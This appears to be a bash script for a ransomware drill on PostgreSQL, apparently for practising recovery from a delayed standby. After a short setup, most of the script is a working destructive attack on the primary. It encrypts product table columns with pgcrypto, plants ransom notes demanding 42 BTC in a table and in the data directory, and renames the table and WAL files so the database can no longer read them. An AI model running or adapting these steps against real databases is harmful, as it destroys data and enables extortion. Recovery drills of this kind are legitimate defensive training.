#!/bin/bash

# =============================================================
# sim3.sh - Full Ransomware Simulation Script
# =============================================================

PORT=5432
USER=postgres
DB=postgres

# ---------------------------------------------------------------
# PART 1: Configure recovery delay on standby (port 5434)
# ---------------------------------------------------------------

psql -p 5434 -d postgres -q -c "ALTER SYSTEM SET recovery_min_apply_delay = '90min';" > /dev/null 2>&1
psql -p 5434 -d postgres -q -c "SELECT pg_reload_conf();" > /dev/null 2>&1

# ---------------------------------------------------------------
# PART 2: Insert data into primary (port 5432)
# ---------------------------------------------------------------

psql -p $PORT -U $USER -d $DB -q <<EOF > /dev/null 2>&1
INSERT INTO products (category_id, sku, name, unit_price, stock_qty)
VALUES
(1,'ELEC-005','Portable SSD 1TB',159.99,350),
(1,'ELEC-006','Bluetooth Speaker Mini',39.99,700),
(2,'CLTH-003','Sports Hoodie',59.99,450),
(3,'HOME-003','Adjustable Laptop Stand',29.99,550),
(4,'SPRT-002','Yoga Mat Pro',35.99,650);
SELECT PG_SLEEP(1);
EOF

# ---------------------------------------------------------------
# PART 3: Capture transaction time
# ---------------------------------------------------------------

psql -p $PORT -U $USER -d $DB -t -A -c "CHECKPOINT;" > /dev/null 2>&1
sleep 1
psql -p $PORT -U $USER -d $DB -t -A -c "SELECT NOW();" > /data/primary/.time.txt

echo "Last Transaction Time: $(cat /data/primary/.time.txt)"

# ---------------------------------------------------------------
# PART 4: Encrypt product data (ransomware simulation)
# ---------------------------------------------------------------

psql -p $PORT -U $USER -d $DB -q <<'EOF' > /dev/null 2>&1

-- Enable pgcrypto
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Convert columns to TEXT so encryption fits
ALTER TABLE products
ALTER COLUMN sku         TYPE TEXT,
ALTER COLUMN name        TYPE TEXT,
ALTER COLUMN description TYPE TEXT,
ALTER COLUMN unit_price  TYPE TEXT USING unit_price::text,
ALTER COLUMN stock_qty   TYPE TEXT USING stock_qty::text;

-- Encrypt product data
UPDATE products
SET
  sku         = encode(pgp_sym_encrypt(sku,         'training_ransom_key'), 'base64'),
  name        = encode(pgp_sym_encrypt(name,        'training_ransom_key'), 'base64'),
  description = encode(pgp_sym_encrypt(COALESCE(description, ''), 'training_ransom_key'), 'base64'),
  unit_price  = encode(pgp_sym_encrypt(unit_price,  'training_ransom_key'), 'base64'),
  stock_qty   = encode(pgp_sym_encrypt(stock_qty,   'training_ransom_key'), 'base64');

-- Create ransom note table
CREATE TABLE ransom_note (
  message text
);

INSERT INTO ransom_note VALUES
('YOUR FILES ARE ENCRYPTED. Pay 42 BTC in 48 hours or your data is gone forever.');

EOF

# ---------------------------------------------------------------
# PART 5: Write ransom note files to disk
# ---------------------------------------------------------------

DATA_DIR=$(psql -p $PORT -U $USER -d $DB -t -A -c "SHOW data_directory;")
RANSOM_FILE="$DATA_DIR/README_RESTORE.txt"

cat <<EOF > "$RANSOM_FILE"
Ransom Note:
>> YOUR TABLES ARE ENCRYPTED.
>> Pay 42 BTC in 48 hours or your data is gone forever.
>> ID: 7721-XKFJ-9921
EOF

cp "$RANSOM_FILE" "$DATA_DIR/base/5/README_RESTORE.txt"

# ---------------------------------------------------------------
# PART 6: Lock table files
# ---------------------------------------------------------------

TARGET_DIR="$DATA_DIR/base/5"
cd "$TARGET_DIR" || exit

for i in ?????; do
    mv "$i" "$i.locked"
done

# ---------------------------------------------------------------
# PART 7: Lock WAL files
# ---------------------------------------------------------------

WAL_DIR="$DATA_DIR/pg_wal"
cd "$WAL_DIR" || exit

for i in 000000*; do
    if [ -f "$i" ]; then
        mv "$i" "$i.locked"
    fi
done
